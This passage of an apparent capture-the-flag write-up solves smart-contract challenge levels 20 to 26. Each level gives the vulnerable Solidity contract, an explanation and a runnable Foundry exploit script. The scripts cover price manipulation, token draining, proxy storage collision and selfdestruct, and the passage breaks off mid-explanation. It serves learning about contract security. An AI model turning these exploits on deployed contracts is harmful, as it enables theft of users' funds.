Denial(payable(0x222eE4906Ab1064Af1c66ccA78c71F9a47b18EAE));\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        new Hack().exploit();\n        vm.stopBroadcast();\n    }\n}\n\ncontract Hack{\n        Denial public instance = Denial(payable(0x222eE4906Ab1064Af1c66ccA78c71F9a47b18EAE));\n        function exploit() public{\n            instance.setWithdrawPartner(address(this));\n        }\n        fallback() external payable{\n            //draining the entire gas with infinite loop\n            uint i = 0;\n            while (i \u003c 10) {}\n        }\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level20Solution.s.sol:Level20Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Shop\n\n**Level21.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface Buyer {\n  function price() external view returns (uint);\n}\n\ncontract Shop {\n  uint public price = 100;\n  bool public isSold;\n\n  function buy() public {\n    Buyer _buyer = Buyer(msg.sender);\n\n    if (_buyer.price() \u003e= price \u0026\u0026 !isSold) {\n      isSold = true;\n      price = _buyer.price();\n    }\n  }\n}\n```\n\n**Goal:**\n\nСan you get the item from the shop for less than the price asked?\n\n**Explanation:**\n\n1. This is similar to the Elevator challenge. Elevator uses a an external normal function to call.\n2. But here `price()` should a view function. Which shouldn’t modify the storage of the contract.\n3. So, we cant just keep the number of the calls to the `price()` function in our Attack contract.\n4. We can make use of `isSold` variable to check that the `price()` is called or not. This can be acceptable inside a view function.\n5. So, I wrote Attack contract with `price()` function defined as view and it returns two different price values for the initial call and second call.\n\n**Level21Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport {Shop} from \"../src/Level21.sol\";\n\ncontract Level21Sol is Script{\n    Shop public instance = Shop(0x0a21654f3EA8917a109E09C32eC3aAF814e8d665);\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        new Attack().exploit();\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack{\n    Shop public instance = Shop(0x0a21654f3EA8917a109E09C32eC3aAF814e8d665);\n\n    function exploit() public {\n        instance.buy();\n    }\n    function price() external view returns (uint){\n        if(instance.isSold() == false){\n            return 100;\n        }\n        return 9;\n    }\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level21Solution.s.sol:Level21Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Dex\n\n**Level22.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\";\nimport \"openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\";\nimport 'openzeppelin-contracts/contracts/access/Ownable.sol';\n\ncontract Dex is Ownable(address(0x00)) {\n  address public token1;\n  address public token2;\n  constructor() {}\n\n  function setTokens(address _token1, address _token2) public onlyOwner {\n    token1 = _token1;\n    token2 = _token2;\n  }\n\n  function addLiquidity(address token_address, uint amount) public onlyOwner {\n    IERC20(token_address).transferFrom(msg.sender, address(this), amount);\n  }\n\n  function swap(address from, address to, uint amount) public {\n    require((from == token1 \u0026\u0026 to == token2) || (from == token2 \u0026\u0026 to == token1), \"Invalid tokens\");\n    require(IERC20(from).balanceOf(msg.sender) \u003e= amount, \"Not enough to swap\");\n    uint swapAmount = getSwapPrice(from, to, amount);\n    IERC20(from).transferFrom(msg.sender, address(this), amount);\n    IERC20(to).approve(address(this), swapAmount);\n    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);\n  }\n\n  function getSwapPrice(address from, address to, uint amount) public view returns(uint){\n    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));\n  }\n\n  function approve(address spender, uint amount) public {\n    SwappableToken(token1).approve(msg.sender, spender, amount);\n    SwappableToken(token2).approve(msg.sender, spender, amount);\n  }\n\n  function balanceOf(address token, address account) public view returns (uint){\n    return IERC20(token).balanceOf(account);\n  }\n}\n\ncontract SwappableToken is ERC20 {\n  address private _dex;\n  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {\n        _mint(msg.sender, initialSupply);\n        _dex = dexInstance;\n  }\n\n  function approve(address owner, address spender, uint256 amount) public {\n    require(owner != _dex, \"InvalidApprover\");\n    super._approve(owner, spender, amount);\n  }\n}\n```\n\n**Goal:**\n\nThe goal of this level is for you to hack the basic DEX contract and steal the funds by price manipulation.\n\nYou will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a “bad” price of the assets.\n\n**Explanation**:\n\n1. You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.\n2. There is a `swap()` function inside Dex contract which swaps one token for another. Inside `swap()` intially two basic checks have been done to check for that the tokens are valid or not. And for the balance of the sender.\n3. Observe that the `getSwapPrice()` is used to get the amount of tokens to be transferred to the `to` address.\n\n```solidity\n  function swap(address from, address to, uint amount) public {\n    require((from == token1 \u0026\u0026 to == token2) ||\n            (from == token2 \u0026\u0026 to == token   1), \"Invalid tokens\");\n    require(IERC20(from).balanceOf(msg.sender) \u003e= amount, \"Not enough to swap\");\n    uint swapAmount = getSwapPrice(from, to, amount);\n    IERC20(from).transferFrom(msg.sender, address(this), amount);\n    IERC20(to).approve(address(this), swapAmount);\n    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);\n  }\n\n  function getSwapPrice(address from, address to, uint amount) public\n  view returns(uint)\n  {\n    return((amount * IERC20(to).balanceOf(address(this)))/\n    IERC20(from).balanceOf(address(this)));\n  }\n```\n\n4.The `amount` is the amount of the tokens that added to the balance of `Dex` contract.\n\n5.`swapAmount` is the amount of tokens that goes to the `to` address from the balance of the `Dex` contract.\n\n6.When I started calculation for `swapAmount`, I have observed that swapping between two tokens slightly increases the balance of the `to` address.\n\n```\n\nFor the first swap:\nswap(Token1, Token2, 10)\nswapAmount = (10 * 100)/100 = 10 + balance of player in token2 is 10\n\t\t   =\u003e 20\n\nFor the second swap:\nswap(Token2, Token1, 20)\nswapAmount = (20*110)/90 = 24 + 0 =\u003e24\n\nFor the third swap:\nswap(Token1, Token2, 24)\nswapAmount = (24*110)/86 = 30 + 0 =\u003e 30\n\nFor the fourth swap:\nswap(Token2, Token1, 30)\nswapAmount = (30*110)/80 = 41 + 0 =\u003e 41\n\nFor the fifth swap:\nswap(Token1, Token2, 41)\nswapAmount = (41*110)/69 = 65 + 0 =\u003e 65\n\nIf we swap(Token2, Token1, 65) then\nswapAmount = (65*110)/45 = 158 but the transaction would fail because the Dex\ndoes not have enough balance to execute the transaction.\n\nWe need to calculate the amountOfToken2ToSell in order to get back 110 Token1\n\n110 Token1 = amountOfToken2ToSell * DexBalanceOfToken1/DexBalanceOfToken2\n110 = amountOfToken2ToSell * 110/45\namountOfToken2ToSell = 45\n\nIf we swap token2 with amount 45 then the balanceOf Token1 in Dex is 0.\n\n\nSwap         |             Dex            |       User\n             |      Token1  | Token2      |  Token1 | Token2\n-----------------------------------------------------------\n Before Swap |     100      | 100         |  10     |  10\n First Swap  |     110      | 90          |  0      |  20\n Second Swap |     86       | 110         |  24     |  0\n Third Swap  |     110      | 80          |  0      |  30\n Fourth Swap |     69       | 110         |  41     |  0\n Fifth Swap  |     110      | 45          |  0      |  65\n\n Sixth Swap  |     0        | 90          |  110    |  20\n\n```\n\n**Level22Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport {Dex} from \"../src/Level22.sol\";\nimport \"openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\";\n\ncontract Level22Sol is Script {\n    Dex public instance = Dex(0x7f2041D22Bf8D693507A9347785C182BBB73285d);\n\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        address token1 = instance.token1();\n        address token2 = instance.token2();\n\n        console.log(token1);\n\n        Attack attack = new Attack();\n\n        instance.approve(address(attack), 10);\n        address myAddress = address(vm.envAddress(\"MY_ADDRESS\"));\n        attack.exploit(myAddress);\n\n        console.log(\n            \"DEX balance in TOKEN1 is \",\n            instance.balanceOf(token1, address(instance))\n        );\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack {\n    Dex public dex = Dex(0x7f2041D22Bf8D693507A9347785C182BBB73285d);\n    address token1 = dex.token1();\n    address token2 = dex.token2();\n\n    function exploit(address myAddress) public {\n        IERC20(token1).transferFrom(myAddress, address(this), 10);\n        IERC20(token2).transferFrom(myAddress, address(this), 10);\n\n        dex.approve(address(dex), type(uint64).max);\n\n        dex.swap(token1, token2, 10);\n        dex.swap(token2, token1, 20);\n        dex.swap(token1, token2, 24);\n        dex.swap(token2, token1, 30);\n        dex.swap(token1, token2, 41);\n\n        dex.swap(token2, token1, 45);\n    }\n}\n\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level22Solution.s.sol:Level22Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Dex Two\n\n**Level23.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\";\nimport \"openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\";\nimport 'openzeppelin-contracts/contracts/access/Ownable.sol';\n\ncontract DexTwo is Ownable(msg.sender) {\n  address public token1;\n  address public token2;\n  constructor() {}\n\n  function setTokens(address _token1, address _token2) public onlyOwner {\n    token1 = _token1;\n    token2 = _token2;\n  }\n\n  function add_liquidity(address token_address, uint amount) public onlyOwner {\n    IERC20(token_address).transferFrom(msg.sender, address(this), amount);\n  }\n\n  function swap(address from, address to, uint amount) public {\n    require(IERC20(from).balanceOf(msg.sender) \u003e= amount, \"Not enough to swap\");\n    uint swapAmount = getSwapAmount(from, to, amount);\n    IERC20(from).transferFrom(msg.sender, address(this), amount);\n    IERC20(to).approve(address(this), swapAmount);\n    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);\n  }\n\n  function getSwapAmount(address from, address to, uint amount) public view returns(uint){\n    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));\n  }\n\n  function approve(address spender, uint amount) public {\n    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);\n    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);\n  }\n\n  function balanceOf(address token, address account) public view returns (uint){\n    return IERC20(token).balanceOf(account);\n  }\n}\n\ncontract SwappableTokenTwo is ERC20 {\n  address private _dex;\n  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {\n        _mint(msg.sender, initialSupply);\n        _dex = dexInstance;\n  }\n\n  function approve(address owner, address spender, uint256 amount) public {\n    require(owner != _dex, \"InvalidApprover\");\n    super._approve(owner, spender, amount);\n  }\n}\n```\n\n**Goal:**\n\nYou need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.\n\n**Explanation:**\n\n1. Observe that the `DexTwo` modifies the `swap()` function from the `Dex`. It removed the check of valid tokens.\n2. So, we are now allowed to input any token addresses to the swap() function.\n3. I created two Dummy Tokens and transferred 100 tokens each of the two tokens to the `Dex` address.\n4. I swapped my Dummy tokens with the `token1` and `token2` balances of the `Dex` contract.\n\n**Level23Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport {DexTwo} from \"../src/Level23.sol\";\nimport \"openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\";\nimport \"openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\";\n\ncontract Level23Sol is Script {\n    DexTwo public instance = DexTwo(0x9635173E4b119f8f3f459eAa61a75Ba75d759A63);\n\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        address token1 = address(instance.token1());\n        address token2 = address(instance.token2());\n\n        Attack attack = new Attack();\n        attack.exploit();\n\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack {\n    DexTwo public instance = DexTwo(0x9635173E4b119f8f3f459eAa61a75Ba75d759A63);\n\n    address token1 = address(instance.token1());\n    address token2 = address(instance.token2());\n\n    Dummy dummyToken1;\n\n    constructor() {\n        dummyToken1 = new Dummy();\n    }\n\n    function exploit() public {\n        dummyToken1.transfer(address(instance), 100); //transfering 100 tokens to the Dex contract\n\n        dummyToken1.approve(address(instance), 1000);\n\n        instance.swap(address(dummyToken1), token2, 100);\n        console.log(\n            \"token2 balance after swap  is \",\n            instance.balanceOf(token2, address(instance))\n        );\n\n        // dummyToken1.transfer(address(instance),100);//transfering 100 tokens to the Dex contract\n\n        dummyToken1.approve(address(instance), 1000);\n\n        instance.swap(address(dummyToken1), token1, 200);\n\n        console.log(\n            \"token1 balance after swap  is \",\n            instance.balanceOf(token1, address(instance))\n        );\n    }\n}\n\ncontract Dummy is ERC20(\"DummyToken\", \"Dummy\") {\n    constructor() {\n        _mint(msg.sender, 10000);\n    }\n}\n\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level23Solution.s.sol:Level23Sol --rpc-url $RPC_URL --broadcast\n\n```\n\n## Puzzle Wallet\n\n**Level24.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\npragma experimental ABIEncoderV2;\n\nimport \"./helpers/UpgradeableProxy-08.sol\";\n\ncontract PuzzleProxy is UpgradeableProxy {\n    address public pendingAdmin;\n    address public admin;\n\n    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {\n        admin = _admin;\n    }\n\n    modifier onlyAdmin {\n      require(msg.sender == admin, \"Caller is not the admin\");\n      _;\n    }\n\n    function proposeNewAdmin(address _newAdmin) external {\n        pendingAdmin = _newAdmin;\n    }\n\n    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {\n        require(pendingAdmin == _expectedAdmin, \"Expected new admin by the current admin is not the pending admin\");\n        admin = pendingAdmin;\n    }\n\n    function upgradeTo(address _newImplementation) external onlyAdmin {\n        _upgradeTo(_newImplementation);\n    }\n}\n\ncontract PuzzleWallet {\n    address public owner;\n    uint256 public maxBalance;\n    mapping(address =\u003e bool) public whitelisted;\n    mapping(address =\u003e uint256) public balances;\n\n    function init(uint256 _maxBalance) public {\n        require(maxBalance == 0, \"Already initialized\");\n        maxBalance = _maxBalance;\n        owner = msg.sender;\n    }\n\n    modifier onlyWhitelisted {\n        require(whitelisted[msg.sender], \"Not whitelisted\");\n        _;\n    }\n\n    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {\n      require(address(this).balance == 0, \"Contract balance is not 0\");\n      maxBalance = _maxBalance;\n    }\n\n    function addToWhitelist(address addr) external {\n        require(msg.sender == owner, \"Not the owner\");\n        whitelisted[addr] = true;\n    }\n\n    function deposit() external payable onlyWhitelisted {\n      require(address(this).balance \u003c= maxBalance, \"Max balance reached\");\n      balances[msg.sender] += msg.value;\n    }\n\n    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {\n        require(balances[msg.sender] \u003e= value, \"Insufficient balance\");\n        balances[msg.sender] -= value;\n        (bool success, ) = to.call{ value: value }(data);\n        require(success, \"Execution failed\");\n    }\n\n    function multicall(bytes[] calldata data) external payable onlyWhitelisted {\n        bool depositCalled = false;\n        for (uint256 i = 0; i \u003c data.length; i++) {\n            bytes memory _data = data[i];\n            bytes4 selector;\n            assembly {\n                selector := mload(add(_data, 32))\n            }\n            if (selector == this.deposit.selector) {\n                require(!depositCalled, \"Deposit can only be called once\");\n                // Protect against reusing msg.value\n                depositCalled = true;\n            }\n            (bool success, ) = address(this).delegatecall(data[i]);\n            require(success, \"Error while delegating call\");\n        }\n    }\n}\n```\n\n**Goal:**\n\nYou’ll need to hijack this wallet to become the admin of the proxy.\n\n**Explanation:**\n\n1. `PuzzleProxy` is a proxy contract and `PuzzleWallet` is an implementation contract.\n2. Calls to `PuzzleProxy` will be forwarded to the `PuzzleWallet` through `delegatecall`.\n3. Here, the storage layout of the two contracts are not matched. It may lead to storage collisions.\n4. We need to become the admin of the proxy contract.\n5. We can propose a new admin which will update the `pendingAdmin` variable in PuzzleProxy as well as the `owner` inside PuzzleWallet. Because of storage collision.\n6. Then call the `addToWhiteList()` with our Attacker address to be able to call other functions of PuzzleWallet.\n7. To override the `admin` variable in PuzzleProxy contract we have to change the `maxPrice` variable to address of our Attacker.\n8. To update `maxPrice` we need to drain all the funds of the the PuzzleWallet. Initially it has 0.001 ether, We can able to deposit some ether and withdraw the same amount of ether only using the `execute()` function.\n9. If we somehow able to pass this `require(balances[msg.sender] \u003e= value, \"Insufficient balance\");` check we can withdraw more ether from wallet.\n10. To do so, we need to send 0.001 ether only to the wallet, but we need to update the `balance[msg.sender]` to double of it. So that we can withdraw() 0.002 ether from the wallet. So that wallet balance will be zero.\n11. We can use the `multicall()` function to do this, we call the `multicall()` with 0.001 ether and pass the function signature of the `deposit()` so that our balance will become 0.001 ether and balance of wallet will be 0.002 ether.\n12. We cant call `deposit()` twice in a single call by passing calldata as [signature of `deposit` + signature of `deposit`]. As there is a check to catch this case.\n13. But we can send the singature of the `deposit()` and a call to `multicall()` again with the `deposit()` signature.\n14. That is we are calling multicall with a `deposit()` calldata along with multicall calldata with `deposit()` signature. i.e, a nested multicall.\n15. This will modify the `balance[msg.sender]` twice so that it will become 0.00 ether, but the actual wallet balance is 0.002.\n16. Now we have enough `balance[msg.sender]` to pass the check done in `execute()` function.\n17. So, now we can withdraw 0.002 ether from wallet, therefore the wallet balance becomes `zero`.\n\n**Level24Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport \"../src/Level24.sol\";\n\ncontract Level24Sol is Script {\n    PuzzleProxy public proxy =\n        PuzzleProxy(payable(0x5415eC6D56a799978BdEd9166328De045f52366D));\n    PuzzleWallet public wallet =\n        PuzzleWallet(0x5415eC6D56a799978BdEd9166328De045f52366D);\n\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        console.log(\"Wallet Owner  :\", wallet.owner());\n        console.log(\"Proxy Admin :\", proxy.admin());\n        console.log(\"Wallet Max Balance : \", wallet.maxBalance());\n        console.log(\"Proxy Pending Admin : \", proxy.pendingAdmin());\n        console.log(\"Wallet balance : \", address(wallet).balance);\n\n        Attack attack = new Attack();\n\n        attack.exploit{value: 0.001 ether}();\n\n        console.log(\"Wallet Owner  :\", wallet.owner());\n        console.log(\"Proxy Admin :\", proxy.admin());\n        console.log(\"Wallet Max Balance : \", wallet.maxBalance());\n        console.log(\"Proxy Pending Admin : \", proxy.pendingAdmin());\n        console.log(\"Wallet balance : \", address(wallet).balance);\n\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack {\n    PuzzleProxy public proxy =\n        PuzzleProxy(payable(0x5415eC6D56a799978BdEd9166328De045f52366D));\n    PuzzleWallet public wallet =\n        PuzzleWallet(0x5415eC6D56a799978BdEd9166328De045f52366D);\n\n    function exploit() public payable {\n        proxy.proposeNewAdmin(address(this));\n\n        wallet.addToWhitelist(address(this));\n\n        bytes[] memory _depositData = new bytes[](1);\n        _depositData[0] = abi.encodeWithSelector(wallet.deposit.selector);\n\n        bytes[] memory data = new bytes[](2);\n        data[0] = _depositData[0];\n        data[1] = abi.encodeWithSelector(\n            wallet.multicall.selector,\n            _depositData\n        ); // nested multicalling\n\n        wallet.multicall{value: 0.001 ether}(data);\n\n        wallet.execute(address(this), 0.002 ether, \"\");\n\n        wallet.setMaxBalance(\n            uint256(\n                uint160(address(0x2e118e720e4142E75fC79a0f57745Af650d39F94))\n            )\n        );\n    }\n\n    receive() external payable {}\n}\n\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level24Solution.s.sol:Level24Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Motorbike\n\n**Level25.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\n\npragma solidity \u003c0.7.0;\n\nimport \"openzeppelin-contracts-06/utils/Address.sol\";\nimport \"openzeppelin-contracts-06/proxy/Initializable.sol\";\n\ncontract Motorbike {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    struct AddressSlot {\n        address value;\n    }\n\n    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.\n    constructor(address _logic) public {\n        require(Address.isContract(_logic), \"ERC1967: new implementation is not a contract\");\n        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;\n        (bool success,) = _logic.delegatecall(\n            abi.encodeWithSignature(\"initialize()\")//we can able to call the initialize() again since it is a delegate call.\n        );\n        require(success, \"Call failed\");\n    }\n\n    // Delegates the current call to `implementation`.\n    function _delegate(address implementation) internal virtual {\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 { revert(0, returndatasize()) }\n            default { return(0, returndatasize()) }\n        }\n    }\n\n    // Fallback function that delegates calls to the address returned by `_implementation()`.\n    // Will run if no other function in the contract matches the call data\n    fallback () external payable virtual {\n        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);\n    }\n\n    // Returns an `AddressSlot` with member `value` located at `slot`.\n    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {\n        assembly {\n            r_slot := slot\n        }\n    }\n}\n/*\n*/\ncontract Engine is Initializable {\n    // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    address public upgrader;\n    uint256 public horsePower;\n\n    struct AddressSlot {\n        address value;\n    }\n\n//this initializer modifier prevents the function from being  calling twice.\n    function initialize() external initializer {\n        horsePower = 1000;\n        upgrader = msg.sender;\n    }\n\n    // Upgrade the implementation of the proxy to `newImplementation`\n    // subsequently execute the function call\n    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {\n        _authorizeUpgrade();\n        _upgradeToAndCall(newImplementation, data);\n    }\n\n    // Restrict to upgrader role\n    function _authorizeUpgrade() internal view {\n        require(msg.sender == upgrader, \"Can't upgrade\");\n    }\n\n    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.\n    function _upgradeToAndCall(\n        address newImplementation,\n        bytes memory data\n    ) internal {\n        // Initial upgrade and setup call\n        _setImplementation(newImplementation);\n        if (data.length \u003e 0) {\n            (bool success,) = newImplementation.delegatecall(data);\n            require(success, \"Call failed\");\n        }\n    }\n\n    // Stores a new address in the EIP1967 implementation slot.\n    function _setImplementation(address newImplementation) private {\n        require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n\n        AddressSlot storage r;\n        assembly {\n            r_slot := _IMPLEMENTATION_SLOT\n        }\n        r.value = newImplementation;\n    }\n}\n```\n\n**Goal:**\n\nWould you be able to selfdestruct its engine and make the motorbike unusable ?\n\n**Explanation:**\n\n1. This is another upgradeable proxy contract setup. Motorbike contract is the proxy contract which forwards the calls to the implementation contract Engine.\n2. This time no storage collison is happened.\n3. We need to change the `upgrader` of the Engine contract and `selfdestruct` the Engine contract.\n4. We have to write an Attack contract which has the selfdestruct function and change the implementation address.\n5. We see only one time the `upgrader` was assigned inside Engine contract, that is inside `initialize()` function. And this initialize function was called inside the constructor of the Motobike.\n6. But observe that this call was done using `delegatecall`, which is done in the context of the Motorbike. Not the Engine contract.\n7. This means the `initialize()` function can be called again as the `intializer` modfier not updated.\n8. By calling `intialize()`, we will become the upgrader of the Engine contract.\n9. Now, we can update the implementation addres by calling `upgradeToAndCall()` function and pass the data as the signature of the `destructEngine()` function to be called by the Engine contract.\n10. This will destruct the Engine contract, because the call was done using `delegatecall` so the storage of the Engine will be affected.\n\n**Level25Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity \u003c0.7.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\nimport \"../src/Level25.sol\";\n\ncontract Level25Sol is Script {\n    bytes32 internal constant _IMPLEMENTATION_SLOT =\n        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n    Motorbike instance = Motorbike(0x20072a9B2075f613965e9AE956de56E2d68A45B2);\n\n    Engine engineAddress =\n        Engine(\n            address(\n                uint160(\n                    uint256(vm.load(address(instance), _IMPLEMENTATION_SLOT))\n                )\n            )\n        );\n\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        console.log(address(engineAddress));\n        new Attack().exploit(address(engineAddress));\n\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack {\n    Engine public engine;\n\n    function exploit(address _engine) public {\n        engine = Engine(_engine);\n\n        engine.initialize();\n\n        console.log(engine.upgrader());\n\n        bytes memory killSelector = abi.encodeWithSelector(this.kill.selector);\n\n        engine.upgradeToAndCall(address(this), killSelector);\n    }\n\n    function kill() external {\n        selfdestruct(payable(address(this)));\n    }\n\n    receive() external payable {}\n}\n\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level25Solution.s.sol:Level25Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Double Entry Point\n\n**Level26.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"openzeppelin-contracts-06/access/Ownable.sol\";\nimport \"openzeppelin-contracts-06/token/ERC20/ERC20.sol\";\n\ninterface DelegateERC20 {\n    function delegateTransfer(\n        address to,\n        uint256 value,\n        address origSender\n    ) external returns (bool);\n}\n\ninterface IDetectionBot {\n    function handleTransaction(address user, bytes calldata msgData) external;\n}\n\ninterface IForta {\n    function setDetectionBot(address detectionBotAddress) external;\n\n    function notify(address user, bytes calldata msgData) external;\n\n    function raiseAlert(address user) external;\n}\n\ncontract Forta is IForta {\n    mapping(address =\u003e IDetectionBot) public usersDetectionBots;\n    mapping(address =\u003e uint256) public botRaisedAlerts;\n\n    function setDetectionBot(address detectionBotAddress) external override {\n        usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);\n    }\n\n    function notify(address user, bytes calldata msgData) external override {\n        if (address(usersDetectionBots[user]) == address(0)) return;\n        try usersDetectionBots[user].handleTransaction(user, msgData) {\n            return;\n        } catch {}\n    }\n\n    function raiseAlert(address user) external override {\n        if (address(usersDetectionBots[user]) != msg.sender) return;\n        botRaisedAlerts[msg.sender] += 1;\n    }\n}\n\ncontract CryptoVault {\n    address public sweptTokensRecipient;\n    IERC20 public underlying; //doubleentrypoint\n\n    constructor(address recipient) {\n        sweptTokensRecipient = recipient;\n    }\n\n    function setUnderlying(address latestToken) public {\n        require(address(underlying) == address(0), \"Already set\");\n        underlying = IERC20(latestToken);\n    }\n\n    /*\n    ...\n    */\n\n    function sweepToken(IERC20 token) public {\n        require(token != underlying, \"Can't transfer underlying token\");\n        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));\n    }\n}\n\ncontract LegacyToken is ERC20(\"LegacyToken\", \"LGT\"), Ownable {\n    DelegateERC20 public delegate; //delegate is doublEntry  point  contract itself.\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n\n    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {\n        delegate = newContract;\n    }\n\n    function transfer(\n        address to,\n        uint256 value\n    ) public override returns (bool) {\n        if (address(delegate) == address(0)) {\n            return super.transfer(to, value);\n        } else {\n            return delegate.delegateTransfer(to, value, msg.sender);\n        }\n    }\n}\n\ncontract DoubleEntryPoint is\n    ERC20(\"DoubleEntryPointToken\", \"DET\"),\n    DelegateERC20,\n    Ownable\n{\n    address public cryptoVault;\n    address public player;\n    address public delegatedFrom;\n    Forta public forta;\n\n    constructor(\n        address legacyToken,\n        address vaultAddress,\n        address fortaAddress,\n        address playerAddress\n    ) {\n        delegatedFrom = legacyToken;\n        forta = Forta(fortaAddress);\n        player = playerAddress;\n        cryptoVault = vaultAddress;\n        _mint(cryptoVault, 100 ether);\n    }\n\n    modifier onlyDelegateFrom() {\n        require(msg.sender == delegatedFrom, \"Not legacy contract\");\n        _;\n    }\n\n    modifier fortaNotify() {\n        address detectionBot = address(forta.usersDetectionBots(player));\n\n        // Cache old number of bot alerts\n        uint256 previousValue = forta.botRaisedAlerts(detectionBot);\n\n        // Notify Forta\n        forta.notify(player, msg.data);\n\n        // Continue execution\n        _;\n\n        // Check if alarms have been raised\n        if (forta.botRaisedAlerts(detectionBot) \u003e previousValue)\n            revert(\"Alert has been triggered, reverting\");\n    }\n\n    function delegateTransfer(\n        address to,\n        uint256 value,\n        address origSender\n    ) public override onlyDelegateFrom fortaNotify returns (bool) {\n        _transfer(origSender, to, value);\n        return true;\n    }\n}\n\n```\n\n**Goal:**\n\nDrain the underlying token balance of CryptoVault and Write a detection bot to catch this bug.\n\n**Explanation:**\n\n1. There are four contracts in total `CryptoVault`, `DoubleEntryPoint`, `LegacyToken` and `Forta`.\n2. CryptoVault implemented `sweepToken()` function which allows us to sweep all the tokens from the CryptoVault except the `underlying` tokens.\n3. The underlying token is an instance of the DET token implemented in the DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it. Additionally the CryptoVault also holds 100 of LegacyToken LGT.\n4. LegacyToken is simple ERC20 token which is already deployed and minted 100 tokens for the CryptoVault.\n5. 